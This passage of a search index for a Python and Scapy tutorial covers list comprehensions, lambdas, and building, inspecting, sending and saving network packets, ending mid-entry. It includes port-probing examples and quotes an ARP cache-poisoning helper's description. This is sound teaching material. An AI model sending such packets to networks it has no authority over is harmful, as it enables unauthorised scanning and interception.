            "location": "/python/python/index.html#examples", 
            "text": "# compute a list of their squares of elements in a list\nnums = [1, 2, 3, 4]\n\nsquares = [ n * n for n in nums ]   ## [1, 4, 9, 16]   port_numbers = [22,25,80,139,443]  [k for k in port_numbers]\n[22, 25, 80, 139, 443]   numbers = [2,4,6,8]   [k*2 for k in numbers]\n[4, 8, 12, 16]   You can add an if test to the right of the for-loop to narrow the result. The if test is evaluated for each element, including only the elements where the test is true.    port_numbers = [22,25,80,139,443,8080,9999,55555]    [k for k in port_numbers if k 1023]\n[22, 25, 80, 139, 443]", 
            "title": "Examples"
        }, 
        {
            "location": "/python/python/index.html#lambda-functions", 
            "text": "Syntax:  lambda arg1, arg2,  argN : expression using arguments .      \n- Python supports the creation of anonymous functions (i.e. functions that are not bound to a name) at runtime, using a construct called  lambda . \n- Lambda functions take any number of arguments but only has one expression, the result of this expression is returned.   def f (x): return x**2\n...   print f(8)\n64    g = lambda x: x**2    print g(8)\n64   Lambda functions can be used anywhere a function is expected, not necessary to assign it to a variable.  You can pass lambda functions to other functions to do stuff(for example lambda function as key to sorted())     Extracting numbers that are multiples of 3.  One element of data structure(a list here) gets passed to the lambda function at a time.  Lambda function can only have one expression.  filter  is a built-in function in Python that take a function and a data structure as arguments, passes one element of data structure at a time to the function.    mult3 = filter(lambda x: x % 3 == 0, [1, 2, 3, 4, 5, 6, 7, 8, 9])  mult3\n[3, 6, 9]   Sort elements in list by last character.    lis = ['az', 'bbbbbbt', 'cccx']   sorted_by_last = sorted(lis, key = lambda(x): x[-1] )      sorted_by_last\n['bbbbbbt', 'cccx', 'az']   Extracting privileged ports(under 1024) from a list of port numbers using lambda function.    open_ports = [1,20,21,25,80,443,1639,4444,6798]    privileged_ports = filter(lambda x: x  1024, open_ports)  privileged_ports\n[1, 20, 21, 25, 80, 443]     Doing the same with normal function.  If you are not comfortable with using lambda functions, you can simply use normal functions.    def extract_priv_ports(port_number):\n...     if port_number   1024:\n...         return port_number   privileged_ports = filter(extract_priv_ports, open_ports)  privileged_ports\n[1, 20, 21, 25, 80, 443]     Using Lambda  Lambda funtions are good when they are short and as throw away functions. If you plan on doing anything remotely complex with it, put lambda away and define a real function.", 
            "title": "Lambda functions"
        }, 
        {
            "location": "/scapy/scapy_intro/index.html", 
            "text": "Scapy - Intro\n\n\nTrivia\n\n\n\n\nScapy is packet crafting, manipulating and analysis suite . \n\n\nPython interpreter disguised as a Domain Specific Language. \n\n\nCreated by Philippe Biondi.\n\n\n\n\nOverview\n\n\n\n\nHelps to forge packets, send \n recieve packets, R\nW pcaps, alter packets.\n\n\nEasy \n faster packet desgining.\n\n\nDozens of in-built functions to automate various network utilities/attacks..\n\n\n\n\nWhat\ns different about Scapy?\n\n\nYou might be wondering that there are dozens of packet crafting tools and why use Scapy?\n\n\n\n\n\n\nDecode, Not Interpret .\n\n\n\n\n\n\nProbe Once, Interpret Many Times.\n\n\n\n\n\n\nScapy is not a simple shell command program; \nScapy runs inside Python interpreter\n, provides you the whole language when dealing with packets but you don\u2019t need to master Python to use Scapy though.\n\n\n\n\n\n\nScapy Limitations\n\n\n\n\n\n\nScapy is not designed for fast throughput. It\ns written in Python which comes with many layers of abstraction.\n\n\n\n\n\n\nScapy does not go easy on memory(Each packet is a class instance). Not a right choice for analysing large packet captures.", 
            "title": "Scapy Intro"
        }, 
        {
            "location": "/scapy/scapy_intro/index.html#scapy-intro", 
            "text": "", 
            "title": "Scapy - Intro"
        }, 
        {
            "location": "/scapy/scapy_intro/index.html#trivia", 
            "text": "Scapy is packet crafting, manipulating and analysis suite .   Python interpreter disguised as a Domain Specific Language.   Created by Philippe Biondi.", 
            "title": "Trivia"
        }, 
        {
            "location": "/scapy/scapy_intro/index.html#overview", 
            "text": "Helps to forge packets, send   recieve packets, R W pcaps, alter packets.  Easy   faster packet desgining.  Dozens of in-built functions to automate various network utilities/attacks..", 
            "title": "Overview"
        }, 
        {
            "location": "/scapy/scapy_intro/index.html#whats-different-about-scapy", 
            "text": "You might be wondering that there are dozens of packet crafting tools and why use Scapy?    Decode, Not Interpret .    Probe Once, Interpret Many Times.    Scapy is not a simple shell command program;  Scapy runs inside Python interpreter , provides you the whole language when dealing with packets but you don\u2019t need to master Python to use Scapy though.", 
            "title": "What's different about Scapy?"
        }, 
        {
            "location": "/scapy/scapy_intro/index.html#scapy-limitations", 
            "text": "Scapy is not designed for fast throughput. It s written in Python which comes with many layers of abstraction.    Scapy does not go easy on memory(Each packet is a class instance). Not a right choice for analysing large packet captures.", 
            "title": "Scapy Limitations"
        }, 
        {
            "location": "/scapy/scapy_modes/index.html", 
            "text": "Scapy - Interactive mode\n\n\n\n\nJust run \nscapy\n command in your terminal. You will be presented with an interactive interpreter.\n\n\nIt\ns just a Python interpreter disguised as a Domain Specific Language i.e. python interpreter loaded with scapy classes and objects.\n\n\nScapy in interactive mode suits well for one-liners.\n\n\n\n\nverax@humla ~/humla $ scapy\nWelcome to Scapy (2.3.1)\n\n \n\n \n\n sniff()\n^C\nSniffed: TCP:281 UDP:0 ICMP:0 Other:2\n\n\n\n\n\n\n\nImporting Scapy as a module\n\n\n\n\nScapy can be imported as an externam module into any python scipt.\n\n\n\n\n from scapy.all import *\n\n dir()\n['AES', 'AH', 'ARC2', 'ARC4', 'ARP', 'ARPHDR_ETHER', 'ARPHDR_LOOPBACK', 'ARPHDR_METRICOM'   [...snipped...]\n\n IP\n\nclass 'scapy.layers.inet.IP'\n\n\n TCP\n\nclass 'scapy.layers.inet.TCP'", 
            "title": "Scapy Modes"
        }, 
        {
            "location": "/scapy/scapy_modes/index.html#scapy-interactive-mode", 
            "text": "Just run  scapy  command in your terminal. You will be presented with an interactive interpreter.  It s just a Python interpreter disguised as a Domain Specific Language i.e. python interpreter loaded with scapy classes and objects.  Scapy in interactive mode suits well for one-liners.   verax@humla ~/humla $ scapy\nWelcome to Scapy (2.3.1)      sniff()\n^C Sniffed: TCP:281 UDP:0 ICMP:0 Other:2", 
            "title": "Scapy - Interactive mode"
        }, 
        {
            "location": "/scapy/scapy_modes/index.html#importing-scapy-as-a-module", 
            "text": "Scapy can be imported as an externam module into any python scipt.    from scapy.all import *  dir()\n['AES', 'AH', 'ARC2', 'ARC4', 'ARP', 'ARPHDR_ETHER', 'ARPHDR_LOOPBACK', 'ARPHDR_METRICOM'   [...snipped...]  IP class 'scapy.layers.inet.IP'   TCP class 'scapy.layers.inet.TCP'", 
            "title": "Importing Scapy as a module"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html", 
            "text": "Exploring scapy\n\n\nList of protocols supported\n\n\n ls()\nARP        : ARP\nDNS        : DNS\nDot11      : 802.11\nTCP        : TCP\nEther      : Ethernet\n[...]\n\n\n\n\nDissecting protocols\n\n\n ls(IP)\nversion    : BitField             = (4)\nihl        : BitField             = (None)\ntos        : XByteField           = (0)\nlen        : ShortField           = (None)\nid         : ShortField           = (1)\nflags      : FlagsField           = (0)\nfrag       : BitField             = (0)\nttl        : ByteField            = (64)\nproto      : ByteEnumField        = (0)\nchksum     : XShortField          = (None)\nsrc        : Emph                 = (None)\ndst        : Emph                 = ('127.0.0.1')\noptions    : PacketListField      = ([])\n\n\n\n\nList of all the scapy commands\n\n\n lsc()\nrdpcap     : Read a pcap file and return a packet \nsend       : Send packets at layer 3\nsendp      : Send packets at layer 2\nsendpfast  : Send packets at layer 2 using tcpreplay\n[...]\n\n\n\n\nGetting help on any function\n\n\n help(arpcachepoison)\n\nHelp on function arpcachepoison in module scapy.layers.l2:\n\narpcachepoison(target, victim, interval=60)\n    Poison target's cache with (your MAC,victim's IP) couple\n    arpcachepoison(target, victim, [interval=60]) -\n None\n\n[...]\n\n\n\n\nChange Scapy configuration\n\n\n conf\niface      = 'eth3'\niface6     = 'wlan0'\nwepkey     = ''\nsniff_promisc = 1\n[...]\n\n\n\n\n\n\nRoot Alert!\n\n\nAssembling and sending raw packets requires UID 0(root access) . Use sudo to become root.", 
            "title": "Exploring scapy"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html#exploring-scapy", 
            "text": "", 
            "title": "Exploring scapy"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html#list-of-protocols-supported", 
            "text": "ls()\nARP        : ARP\nDNS        : DNS\nDot11      : 802.11\nTCP        : TCP\nEther      : Ethernet\n[...]", 
            "title": "List of protocols supported"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html#dissecting-protocols", 
            "text": "ls(IP)\nversion    : BitField             = (4)\nihl        : BitField             = (None)\ntos        : XByteField           = (0)\nlen        : ShortField           = (None)\nid         : ShortField           = (1)\nflags      : FlagsField           = (0)\nfrag       : BitField             = (0)\nttl        : ByteField            = (64)\nproto      : ByteEnumField        = (0)\nchksum     : XShortField          = (None)\nsrc        : Emph                 = (None)\ndst        : Emph                 = ('127.0.0.1')\noptions    : PacketListField      = ([])", 
            "title": "Dissecting protocols"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html#list-of-all-the-scapy-commands", 
            "text": "lsc()\nrdpcap     : Read a pcap file and return a packet \nsend       : Send packets at layer 3\nsendp      : Send packets at layer 2\nsendpfast  : Send packets at layer 2 using tcpreplay\n[...]", 
            "title": "List of all the scapy commands"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html#getting-help-on-any-function", 
            "text": "help(arpcachepoison)\n\nHelp on function arpcachepoison in module scapy.layers.l2:\n\narpcachepoison(target, victim, interval=60)\n    Poison target's cache with (your MAC,victim's IP) couple\n    arpcachepoison(target, victim, [interval=60]) -  None\n\n[...]", 
            "title": "Getting help on any function"
        }, 
        {
            "location": "/scapy/scapy_exploring/index.html#change-scapy-configuration", 
            "text": "conf\niface      = 'eth3'\niface6     = 'wlan0'\nwepkey     = ''\nsniff_promisc = 1\n[...]   Root Alert!  Assembling and sending raw packets requires UID 0(root access) . Use sudo to become root.", 
            "title": "Change Scapy configuration"
        }, 
        {
            "location": "/scapy/creating_packets/index.html", 
            "text": "Creating packets with Scapy\n\n\nCreating a packet\n\n\n\n\nScapy packet creation is consistent with layered approach in networking.\n\n\nThe basic building block of a packet is a layer, and a whole packet is built by stack- ing layers on top of one another.\n\n\nIn scapy, packets are constructed by defining packet headers for each protocol at different layers of TCP/IP and then stacking these layers in order.\n\n\nTo create a DNS query, you need to build Ether(sometimes optional), IP,UDP headers and stack them using \n/\n operator.\n\n\n\n\nCreating packet in one line\n\n\n packet = Ether()/IP(dst='8.8.8.8')/TCP(dport=53,flags='S')\n\n\n\n\n\n\nA full-fledged DNS request packet\n\n\n\n\n dns_query = Ether()/IP(dst='8.8.8.8')/UDP(dport=53)/DNS(opcode='QUERY')/DNSQR(qname='null.co.in', qtype = 'A')\n\n \n\n dns_query\n\nEther  type=0x800 |\nIP  frag=0 proto=udp dst=8.8.8.8 |\nUDP  sport=domain dport=domain |\nDNS  opcode=QUERY |\nDNSQR  qname='null.co.in' qtype=A |\n\n\n\n\n\nCreate each layer individually and stack them using \n/\n operator\n\n\n l2 = Ether()\n\n l3 = IP(dst='8.8.8.8/30')\n\n l4 = TCP(dport=53, flags = 'S')\n\n packet = l2/l3/l4\n\n\n\n\n\n\nScapy IP notations\n\n\nScapy accepts plain dotted-quad IP notation, CIDR notation, hostnames.\n\n\n packet = IP(dst = '8.8.8.8')\n\n \n\n packet = IP(dst = 'scanme.nmap.org')\n\n \n\n packet = IP(dst = '8.8.8.8/30')\n\n# Above line created 4 packets in one statements implicitly.\n# Using list comprehensions to view all the packets.\n\n [a for a in packet]\n[\nIP  dst=8.8.8.8 |\n, \nIP  dst=8.8.8.9 |\n, \nIP  dst=8.8.8.10 |\n, \nIP  dst=8.8.8.11 |\n]\n\n\n packet = IP(dst = 'egadz.metasploit.com/30')", 
            "title": "Creating packets"
        }, 
        {
            "location": "/scapy/creating_packets/index.html#creating-packets-with-scapy", 
            "text": "", 
            "title": "Creating packets with Scapy"
        }, 
        {
            "location": "/scapy/creating_packets/index.html#creating-a-packet", 
            "text": "Scapy packet creation is consistent with layered approach in networking.  The basic building block of a packet is a layer, and a whole packet is built by stack- ing layers on top of one another.  In scapy, packets are constructed by defining packet headers for each protocol at different layers of TCP/IP and then stacking these layers in order.  To create a DNS query, you need to build Ether(sometimes optional), IP,UDP headers and stack them using  /  operator.   Creating packet in one line   packet = Ether()/IP(dst='8.8.8.8')/TCP(dport=53,flags='S')   A full-fledged DNS request packet    dns_query = Ether()/IP(dst='8.8.8.8')/UDP(dport=53)/DNS(opcode='QUERY')/DNSQR(qname='null.co.in', qtype = 'A')    dns_query Ether  type=0x800 | IP  frag=0 proto=udp dst=8.8.8.8 | UDP  sport=domain dport=domain | DNS  opcode=QUERY | DNSQR  qname='null.co.in' qtype=A |   Create each layer individually and stack them using  /  operator   l2 = Ether()  l3 = IP(dst='8.8.8.8/30')  l4 = TCP(dport=53, flags = 'S')  packet = l2/l3/l4", 
            "title": "Creating a packet"
        }, 
        {
            "location": "/scapy/creating_packets/index.html#scapy-ip-notations", 
            "text": "Scapy accepts plain dotted-quad IP notation, CIDR notation, hostnames.   packet = IP(dst = '8.8.8.8')    packet = IP(dst = 'scanme.nmap.org')    packet = IP(dst = '8.8.8.8/30')\n\n# Above line created 4 packets in one statements implicitly.\n# Using list comprehensions to view all the packets.  [a for a in packet]\n[ IP  dst=8.8.8.8 | ,  IP  dst=8.8.8.9 | ,  IP  dst=8.8.8.10 | ,  IP  dst=8.8.8.11 | ]  packet = IP(dst = 'egadz.metasploit.com/30')", 
            "title": "Scapy IP notations"
        }, 
        {
            "location": "/scapy/inspecting_packets/index.html", 
            "text": "Inspecting packets\n\n\nGet detailed description of the packet along with datatypes\n\n\n packet = IP()/TCP()\n\n ls(packet)\nversion    : BitField             = 4               (4)\nihl        : BitField             = None            (None)\ntos        : XByteField           = 0               (0)\nlen        : ShortField           = None            (None)\nid         : ShortField           = 1               (1)\nflags      : FlagsField           = 0               (0)\nfrag       : BitField             = 0               (0)\nttl        : ByteField            = 64              (64)\nproto      : ByteEnumField        = 6               (0)\nchksum     : XShortField          = None            (None)\nsrc        : Emph                 = '127.0.0.1'     (None)\ndst        : Emph                 = '127.0.0.1'     ('127.0.0.1')\noptions    : PacketListField      = []              ([])\n[-- snipped --]\n\n\n\n\n\n\n\nDisplay short  \n interesting summary of a packet.\n\n\n packet.summary()\n'Ether / IP / TCP 192.168.1.100:ftp_data \n 8.8.8.8:domain S'\n\n\n\n\n\n\nShow() function displays detailed headers but \ndoes not assemble\n the packet\n\n\n packet.show()\n###[ IP ]###\n  version= 4\n  ihl= None\n  len= None\n  [...]\n  proto= hopopt\n  chksum= None\n  src= 192.168.1.100\n  dst= Net('8.8.8.8/30')\n\n\n\n\n\n\nShow2() is similar to show() but also assembles\nthe packet and calculates the checksums and IHL.\n\n\n packet.show2()\n###[ IP ]###\n  version= 4L\n  ihl= 5L\n  [...]\n  ttl= 64\n  proto= hopopt\n  chksum= 0xa8cd\n  src= 192.168.1.100\n  dst= 8.8.8.8\n\n### ** Get only the values supplied by the user.\n\n\n\n\n\n\nGet only user supplied values\n\n\n b.hide_defaults( )\n\n\n\n\n\n\nInteracting with fields inside packet\n\n\nTo access a specific field: [packet_name].[field]\n\n\n packet.dst\n'd8:55:a3:fe:80:78'\n\n\n\n\n\n\nFor fields that are not unique [packet_name][proto].[field]\n\n\n packet[Ether].dst\n'd8:55:a3:fe:80:78'\n\n packet[IP].dst\n'8.8.8.8'\n\n\n\n\n\n\n.payload\n ignores the lowest layer and parses the next layer.\n\n\n packet.payload.flags\n0\n\n packet.payload.payload.flags\n2\n\n\n\n\n\n\n.haslayer\n checks for presence of a layer in a packet\n\n\n if packet.haslayer(TCP):\n...     print packet[TCP].flags\n... \n2\n\n\n\n\n\n\n\n\nScapy\ns sprintf\n\n\n\n\nsprintf()\n method is one of the very powerful features of Scapy.\nsprintf\n comes very handy while writing custom tools.\n\n\nsprintf\n fills a format string with values from the packet , much like it sprintf from C Library, except here it fills the format string with field values from packets.\n\n\n\n\n packet.sprintf(\nEthernet source is %Ether.src% and IP proto is %IP.proto%\n)\n'Ethernet source is 00:00:00:00:00:00 and IP proto is icmp'\n\n\n\n\n\n a=Ether( )/Dot1Q(vlan=42)/IP(dst=\n192.168.0.1\n)/TCP(flags=\nRA\n)\n\n\n\n a.sprintf(\n%dst% %IP.dst% vlan=%Dot1Q.vlan%\n)\n'00:00:d4:ae:3f:71 192.168.0.1 vlan=42'\n\n\n\na.sprintf(\n %TCP.flags% | %5s,TCP.flags% | %#05xr,TCP.flags%\n)\n' RA | RA    | 0x014'\n\n\n\n\n res.nsummary(lfilter = lambda (s,r): r[TCP].flags \n 2)\n0008 IP / TCP 192.168.5.20:ftp-data \n 192.168.5.22:discard S ==\n\nIP / TCP 192.168.5.22:discard \n 192.168.5.20:ftp-data SA / Padding\n\n\n\n\n res.nsummary(lfilter = lambda (s,r): r[TCP].flags \n 2, prn = lambda (s,r):s.dport)\n0008 9\n0012 13\n0021 22\n0024 25\n\n\n\n\n\n\nPython\u2019s format method\n\n\n\n\nPython string format method generates beautiful output but unlike sprintf it prints literal values.\n\n\n\n\n\n \nEther source is: {} \n IP proto is: {}\n.format(packet.src, packet.proto)\n'Ether source is: 00:00:00:00:00:00 \n IP proto is: 1'", 
            "title": "Inspecting packets"
        }, 
        {
            "location": "/scapy/inspecting_packets/index.html#inspecting-packets", 
            "text": "Get detailed description of the packet along with datatypes   packet = IP()/TCP()  ls(packet)\nversion    : BitField             = 4               (4)\nihl        : BitField             = None            (None)\ntos        : XByteField           = 0               (0)\nlen        : ShortField           = None            (None)\nid         : ShortField           = 1               (1)\nflags      : FlagsField           = 0               (0)\nfrag       : BitField             = 0               (0)\nttl        : ByteField            = 64              (64)\nproto      : ByteEnumField        = 6               (0)\nchksum     : XShortField          = None            (None)\nsrc        : Emph                 = '127.0.0.1'     (None)\ndst        : Emph                 = '127.0.0.1'     ('127.0.0.1')\noptions    : PacketListField      = []              ([])\n[-- snipped --]   Display short    interesting summary of a packet.   packet.summary()\n'Ether / IP / TCP 192.168.1.100:ftp_data   8.8.8.8:domain S'   Show() function displays detailed headers but  does not assemble  the packet   packet.show()\n###[ IP ]###\n  version= 4\n  ihl= None\n  len= None\n  [...]\n  proto= hopopt\n  chksum= None\n  src= 192.168.1.100\n  dst= Net('8.8.8.8/30')   Show2() is similar to show() but also assembles\nthe packet and calculates the checksums and IHL.   packet.show2()\n###[ IP ]###\n  version= 4L\n  ihl= 5L\n  [...]\n  ttl= 64\n  proto= hopopt\n  chksum= 0xa8cd\n  src= 192.168.1.100\n  dst= 8.8.8.8\n\n### ** Get only the values supplied by the user.   Get only user supplied values   b.hide_defaults( )", 
            "title": "Inspecting packets"
        }, 
        {
            "location": "/scapy/inspecting_packets/index.html#interacting-with-fields-inside-packet", 
            "text": "To access a specific field: [packet_name].[field]   packet.dst\n'd8:55:a3:fe:80:78'   For fields that are not unique [packet_name][proto].[field]   packet[Ether].dst\n'd8:55:a3:fe:80:78'  packet[IP].dst\n'8.8.8.8'   .payload  ignores the lowest layer and parses the next layer.   packet.payload.flags\n0  packet.payload.payload.flags\n2   .haslayer  checks for presence of a layer in a packet   if packet.haslayer(TCP):\n...     print packet[TCP].flags\n... \n2", 
            "title": "Interacting with fields inside packet"
        }, 
        {
            "location": "/scapy/inspecting_packets/index.html#scapys-sprintf", 
            "text": "sprintf()  method is one of the very powerful features of Scapy. sprintf  comes very handy while writing custom tools.  sprintf  fills a format string with values from the packet , much like it sprintf from C Library, except here it fills the format string with field values from packets.    packet.sprintf( Ethernet source is %Ether.src% and IP proto is %IP.proto% )\n'Ethernet source is 00:00:00:00:00:00 and IP proto is icmp'   a=Ether( )/Dot1Q(vlan=42)/IP(dst= 192.168.0.1 )/TCP(flags= RA )   a.sprintf( %dst% %IP.dst% vlan=%Dot1Q.vlan% )\n'00:00:d4:ae:3f:71 192.168.0.1 vlan=42'  a.sprintf(  %TCP.flags% | %5s,TCP.flags% | %#05xr,TCP.flags% )\n' RA | RA    | 0x014'   res.nsummary(lfilter = lambda (s,r): r[TCP].flags   2)\n0008 IP / TCP 192.168.5.20:ftp-data   192.168.5.22:discard S == \nIP / TCP 192.168.5.22:discard   192.168.5.20:ftp-data SA / Padding   res.nsummary(lfilter = lambda (s,r): r[TCP].flags   2, prn = lambda (s,r):s.dport)\n0008 9\n0012 13\n0021 22\n0024 25", 
            "title": "Scapy's sprintf"
        }, 
        {
            "location": "/scapy/inspecting_packets/index.html#pythons-format-method", 
            "text": "Python string format method generates beautiful output but unlike sprintf it prints literal values.     Ether source is: {}   IP proto is: {} .format(packet.src, packet.proto)\n'Ether source is: 00:00:00:00:00:00   IP proto is: 1'", 
            "title": "Python\u2019s format method"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html", 
            "text": "Sending \n recieving packets\n\n\n\n\nSend \n recieve funtions are the heart of scapy\ns functionality.\n\n\n\n\n\n\nFine grained options\n\n\nMost scapy funtions like send(), sniff() functions has fine grain options like applying bpf filters, timeout, retry, verbosity etc. Use help(function_name) to find out more options.\n\n\n\n\nsend()\n\n\nSend packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.\n\n\n send(IP(dst=\n1.2.3.4\n)/ICMP())\n.\nSent 1 packets.\n\n\n\n\nsendp()\n\n\nSend packets at Layer 2(Must provide Layer 2 header), Does not recieve any packets.\n\n\n sendp(Ether()/IP(dst=\n1.2.3.4\n,ttl=(1,4)), iface=\neth1\n)\n....\nSent 4 packets.\n\n\n sendp(\nI\u2019m travelling on Ethernet\n, iface=\neth1\n, loop=1, inter=0.2)\n\n\n sendp(rdpcap(\n/tmp/pcapfile\n)) # tcpreplay\n...........\nSent 11 packets.\n\n\n\n\nsr()\n\n\n\n\nSends packets and receiving answers. \n\n\nsr() returns a list of tuples of probe and answer in a packet list, and the unanswered packets.\n\n\n\n\n sr(IP(dst=\n192.168.8.1\n)/TCP(dport=[21,22,23]))\n\nReceived 6 packets, got 3 answers, remaining 0 packets\n(\nResults: UDP:0 TCP:3 ICMP:0 Other:0\n, \nUnanswered: UDP:0\n\n\n ans,unans=_\n\n ans.summary()\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsr1()\n\n\n\n\nSends packets and recieves only the first response . \n\n\nThe function returns a couple of packet and answers, and the unanswered packets.\n\n\n\n\n p=sr1(IP(dst=\nscanme.nmap.org\n)/ICMP()/\nXXXXXXXXXXX\n)\nBegin emission:\n...Finished to send 1 packets.\n.*\nReceived 5 packets, got 1 answers, remaining 0 packets\n\n\n\n\nsrloop()\n\n\n\n\nSends packets, recieves and displays responses, in a loop . \n\n\nThe function returns a couple of packet and answers, and the unanswered\n\n\n\n\n packet = IP(dst='192.168.56.102')/ICMP()\n\n srloop(packet)\nRECV 1: IP / ICMP 192.168.56.102 \n 192.168.56.1 echo-reply 0\nRECV 1: IP / ICMP 192.168.56.102 \n 192.168.56.1 echo-reply 0\nRECV 1: IP / ICMP 192.168.56.102 \n 192.168.56.1 echo-reply 0\n^C        \nSent 3 packets, received 3 packets. 100.0% hits.\n(\nResults: TCP:0 UDP:0 ICMP:3 Other:0\n, \nPacketList: TCP:0 UDP:0 ICMP:0 Other:0\n)\n\n\n\n\n\n\nCorner cases: Curious case of 127.0.0.1\n\n\nThe loopback interface is a very special. Packets going through it are not really assembled and dissassembled.\n\n\nThe kernel routes the packet to its destination while it is still stored an internal structure. The kernel is not aware of what Scapy is doing behind his back, so what you see on the lo interface is also a fake. Except this one did not come from a local structure. Thus the kernel will never receive it.\n\n\nTo speak to local applications, you need to build your packets one layer upper, using a PF_INET/SOCK_RAW socket instead of a PF_PACKET/SOCK_RAW (or its equivalent on other systems that Linux).", 
            "title": "Sending & Recieving"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html#sending-recieving-packets", 
            "text": "Send   recieve funtions are the heart of scapy s functionality.    Fine grained options  Most scapy funtions like send(), sniff() functions has fine grain options like applying bpf filters, timeout, retry, verbosity etc. Use help(function_name) to find out more options.", 
            "title": "Sending &amp; recieving packets"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html#send", 
            "text": "Send packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.   send(IP(dst= 1.2.3.4 )/ICMP())\n.\nSent 1 packets.", 
            "title": "send()"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html#sendp", 
            "text": "Send packets at Layer 2(Must provide Layer 2 header), Does not recieve any packets.   sendp(Ether()/IP(dst= 1.2.3.4 ,ttl=(1,4)), iface= eth1 )\n....\nSent 4 packets.  sendp( I\u2019m travelling on Ethernet , iface= eth1 , loop=1, inter=0.2)  sendp(rdpcap( /tmp/pcapfile )) # tcpreplay\n...........\nSent 11 packets.", 
            "title": "sendp()"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html#sr", 
            "text": "Sends packets and receiving answers.   sr() returns a list of tuples of probe and answer in a packet list, and the unanswered packets.    sr(IP(dst= 192.168.8.1 )/TCP(dport=[21,22,23]))\n\nReceived 6 packets, got 3 answers, remaining 0 packets\n( Results: UDP:0 TCP:3 ICMP:0 Other:0 ,  Unanswered: UDP:0  ans,unans=_  ans.summary()", 
            "title": "sr()"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html#sr1", 
            "text": "Sends packets and recieves only the first response .   The function returns a couple of packet and answers, and the unanswered packets.    p=sr1(IP(dst= scanme.nmap.org )/ICMP()/ XXXXXXXXXXX )\nBegin emission:\n...Finished to send 1 packets.\n.*\nReceived 5 packets, got 1 answers, remaining 0 packets", 
            "title": "sr1()"
        }, 
        {
            "location": "/scapy/sending_recieving/index.html#srloop", 
            "text": "Sends packets, recieves and displays responses, in a loop .   The function returns a couple of packet and answers, and the unanswered    packet = IP(dst='192.168.56.102')/ICMP()  srloop(packet)\nRECV 1: IP / ICMP 192.168.56.102   192.168.56.1 echo-reply 0\nRECV 1: IP / ICMP 192.168.56.102   192.168.56.1 echo-reply 0\nRECV 1: IP / ICMP 192.168.56.102   192.168.56.1 echo-reply 0\n^C        \nSent 3 packets, received 3 packets. 100.0% hits.\n( Results: TCP:0 UDP:0 ICMP:3 Other:0 ,  PacketList: TCP:0 UDP:0 ICMP:0 Other:0 )   Corner cases: Curious case of 127.0.0.1  The loopback interface is a very special. Packets going through it are not really assembled and dissassembled.  The kernel routes the packet to its destination while it is still stored an internal structure. The kernel is not aware of what Scapy is doing behind his back, so what you see on the lo interface is also a fake. Except this one did not come from a local structure. Thus the kernel will never receive it.  To speak to local applications, you need to build your packets one layer upper, using a PF_INET/SOCK_RAW socket instead of a PF_PACKET/SOCK_RAW (or its equivalent on other systems that Linux).", 
            "title": "srloop()"
        }, 
        {
            "location": "/scapy/import_export/index.html", 
            "text": "Importing \n exporting data\n\n\nPCAP format\n\n\n\n\nImport packets from PCAP file.\n\n\n\n\n pkts = rdpcap(\ntemp.cap\n)\n\n\n\n\n pkts = sniff(offline=\ntemp.cap\n)\n\n\n\n\n\n\n\nExport packets to pcap file.\n\n\n\n\n wrpcap(\ntemp.cap\n,pkts)\n\n\n\n\nhexdump format\n\n\n\n\nScapy allows you to export recorded packets in various hex formats.\n\n\nUse hexdump() function to display one or more packets using classic hexdump format:\n\n\n\n\n hexdump(pkt)\n0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.\n0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......\n0020   02 01 08 00 9C 90 5A 61  00 01 E6 DA 70 49 B6 E5   ......Za....pI..\n0030   08 00 08 09 0A 0B 0C 0D  0E 0F 10 11 12 13 14 15   ................\n0040   16 17 18 19 1A 1B 1C 1D  1E 1F 20 21 22 23 24 25   .......... !\n#$%\n0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   \n'()*+,-./012345\n0060   36 37                                              67\n\n\n\n\n\n\nHexdump above can be reimported back into Scapy using import_hexcap() function:\n\n\n\n\n pkt_hex = Ether(import_hexcap())\n0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.\n0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......\n0020   02 01 08 00 9C 90 5A 61  00 01 E6 DA 70 49 B6 E5   ......Za....pI..\n0030   08 00 08 09 0A 0B 0C 0D  0E 0F 10 11 12 13 14 15   ................\n0040   16 17 18 19 1A 1B 1C 1D  1E 1F 20 21 22 23 24 25   .......... !\n#$%\n0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   \n'()*+,-./012345\n0060   36 37                                              67\n\n pkt_hex\n\nEther  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |\nIP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' |\nICMP  type=echo-request code=0 \nchksum=0x9c90 id=0x5a61 seq=0x1 |\nRaw  load='\\xe6\\xdapI\\xb6\\xe5\\x08\\x00\\x08\\t\\n\n\\x0b\\x0c\\r\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\n\\x1f !\n#$%\n\\'()*+,-./01234567' |\n\n\n\n\n\nhex string\n\n\n\n\nYou can also convert entire packet into a hex string using /str() function:\n\n\n\n\n pkt\n\nEther  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |\nIP  version=4L \nihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c \nsrc=192.168.25.130 dst=4.2.2.1 options='' |\nICMP  type=echo-request code=0 